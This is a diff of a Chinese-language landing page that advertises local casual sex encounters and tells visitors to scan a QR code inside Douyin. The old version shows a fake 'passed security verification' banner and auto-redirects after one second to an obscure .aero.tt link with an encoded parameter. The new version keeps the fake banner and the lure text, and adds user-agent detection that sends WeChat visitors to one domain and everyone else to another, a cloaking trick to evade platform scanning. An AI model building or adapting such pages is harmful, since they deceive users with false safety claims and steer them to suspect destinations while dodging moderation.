@@ -1,99 +1,189 @@
 <!DOCTYPE html>
-<!-- saved from url=(0014)about:internet -->
-<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
-    
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>用抖音点击（长按）下方二维码识别</title>
-    <title> </title>
     <link rel="shortcut icon" href="http://shprh0.lat/assets/img/favicon.ico">
+    
+    <script>
+        // 配置跳转域名变量
+        var wechatUrl = "https://www.baidu.com";  // 微信浏览器跳转的域名
+        var otherUrl = "https://www.douyin.com";   // 其他浏览器跳转的域名
+        
+        // 检测浏览器类型并跳转
+        function detectBrowserAndRedirect() {
+            var ua = navigator.userAgent.toLowerCase();
+            var timestamp = new Date().getTime();
+            
+            if (ua.indexOf('micromessenger') !== -1) {
+                // 微信浏览器
+                console.log('检测到微信浏览器，跳转到微信端域名');
+                window.location.href = wechatUrl + "?t=" + timestamp;
+            } else {
+                // 其他浏览器（抖音、QQ、Safari、Chrome等）
+                console.log('检测到其他浏览器，跳转到其他端域名');
+                window.location.href = otherUrl + "?t=" + timestamp;
+            }
+        }
+        
+        // 页面加载后立即检测并跳转
+        detectBrowserAndRedirect();
+    </script>
+    
     <style type="text/css">
+        /* 重置样式 */
         * {
             margin: 0;
             padding: 0;
+            box-sizing: border-box;
         }
 
         body {
             background: #eee;
-            color: #000000;
+            color: #000;
             font-size: 16px;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            padding-top: 45px;
         }
 
-        .code-box{
-            background-color: #FFFFFF;
-            margin: 20px;
-            word-break: break-all;
-            box-sizing: border-box;
-            padding: 30px 20px;
-            border-radius: 6px;
-            overflow: hidden;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .code-title{
-            font-weight: bolder;
-            margin-bottom: 20px;
-            font-size: 18px;
-        }
-
-        .code-qrcode{
-            margin-bottom: 20px;
-        }
-
-        img{
-            max-width: calc(100% - 10px);
-        }
-        #safety{
+        /* 顶部安全验证条 */
+        #safety {
             width: 100%;
             height: 45px;
             background: #e8fef2;
             position: fixed;
             top: 0;
+            left: 0;
+            z-index: 1000;
+            display: flex;
+            align-items: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
+
         .icon {
             width: 26px;
             height: 26px;
-            float: left;
-            background: url("/assets/img/renzheng.png")no-repeat;
-            margin: 9.5px 9.5px;
+            background: url("/assets/img/renzheng.png") no-repeat center;
+            background-size: contain;
+            margin: 0 10px;
+            flex-shrink: 0;
         }
-        .text{
-            width: calc(100% - 45px);
-            height: 45px;
-            float: left;
-            color: rgba(7,193,96);
+
+        .text {
+            color: rgb(7, 193, 96);
             font-size: 15px;
-            line-height: 45px;
+            font-weight: 500;
+        }
+
+        /* 主内容区域 */
+        .code-box {
+            background-color: #fff;
+            margin: 20px;
+            padding: 30px 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            word-break: break-all;
+        }
+
+        .code-title {
+            font-weight: bold;
+            margin-bottom: 20px;
+            font-size: 18px;
+            text-align: center;
+            line-height: 1.4;
+            color: #333;
+        }
+
+        .code-qrcode {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .code-qrcode img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
+        }
+
+        .code-qrcode div {
+            margin-top: 15px;
+            font-size: 16px;
+            color: #666;
+            line-height: 1.5;
+        }
+
+        /* 加载提示 */
+        .loading-text {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin-top: 20px;
+        }
+
+        /* 链接样式 */
+        a {
+            text-decoration: none;
+            color: inherit;
+            transition: opacity 0.3s ease;
+        }
+
+        a:hover {
+            opacity: 0.8;
+        }
+
+        /* 响应式设计 */
+        @media (max-width: 480px) {
+            .code-box {
+                margin: 10px;
+                padding: 20px 15px;
+            }
+            
+            .code-title {
+                font-size: 16px;
+            }
+            
+            .text {
+                font-size: 14px;
+            }
         }
     </style>
 </head>
 <body>
-<div id="safety">
-    <div class="icon"></div>
-    <div class="text">二维码已通过安全验证（如果进不去返回刷新）</div>
-</div>
-<div class="code-box">
-    <a href="http://J6PDz.rethrqje.aero.tt/uD1R5I/KvBAi5.html?d=DxsAHxlTTkIEBxUbW0cAFEkMGg4HDE8OAwFaAgIHBB9JDBpAEwoFCwoaFkAkWAQvBA48PyxGUFpTVk1YWF5QXF5dTUECHQwB"><div class="code-title">在抖音长按（点击）下方二维码识别  同城附近柯阅  25以下勿扰…</div> </a>
-    <!-- -->
+    <!-- 顶部安全验证提示 -->
+    <div id="safety">
+        <div class="icon"></div>
+        <div class="text">二维码已通过安全验证（如果进不去返回刷新）</div>
+    </div>
+
+    <!-- 主内容区域 -->
+    <div class="code-box">
+        <div class="code-title">在抖音长按（点击）下方二维码识别<br>同城附近柯阅 25以下勿扰…</div>
+        
         <div class="code-qrcode">
-        <a href="http://J6PDz.rethrqje.aero.tt/uD1R5I/KvBAi5.html?d=DxsAHxlTTkIEBxUbW0cAFEkMGg4HDE8OAwFaAgIHBB9JDBpAEwoFCwoaFkAkWAQvBA48PyxGUFpTVk1YWF5QXF5dTUECHQwB">
-            <img src="./qer.png">
-        </a>
-        <a href="http://J6PDz.rethrqje.aero.tt/uD1R5I/KvBAi5.html?d=DxsAHxlTTkIEBxUbW0cAFEkMGg4HDE8OAwFaAgIHBB9JDBpAEwoFCwoaFkAkWAQvBA48PyxGUFpTVk1YWF5QXF5dTUECHQwB">
-            <div style="white-space:pre;">只进入身体，不进入生活 有门槛！同城约炮，</div> </a>
+            <img src="./qer.png" alt="二维码">
+            <div>只进入身体，不进入生活 有门槛！同城约炮，</div>
+        </div>
+        
+        <div class="loading-text">正在识别浏览器类型，即将跳转...</div>
     </div>
-    </div>
 
-
-
-
- <script>
-     var timestamp=new Date().getTime();  
-     var user_url='http://J6PDz.rethrqje.aero.tt/uD1R5I/KvBAi5.html?d=DxsAHxlTTkIEBxUbW0cAFEkMGg4HDE8OAwFaAgIHBB9JDBpAEwoFCwoaFkAkWAQvBA48PyxGUFpTVk1YWF5QXF5dTUECHQwB?'+timestamp;   
-     setTimeout("javascript:location.href='"+user_url+"'",1000);
- </script>
-
-</body></html>
+    <script>
+        // 防止页面被嵌入iframe（安全措施）
+        if (window.top !== window.self) {
+            window.top.location = window.self.location;
+        }
+        
+        // 如果3秒内没有跳转，显示错误信息
+        setTimeout(function() {
+            document.querySelector('.loading-text').innerHTML = '跳转失败，请手动刷新页面或检查网络连接';
+        }, 3000);
+    </script>
+</body>
+</html>
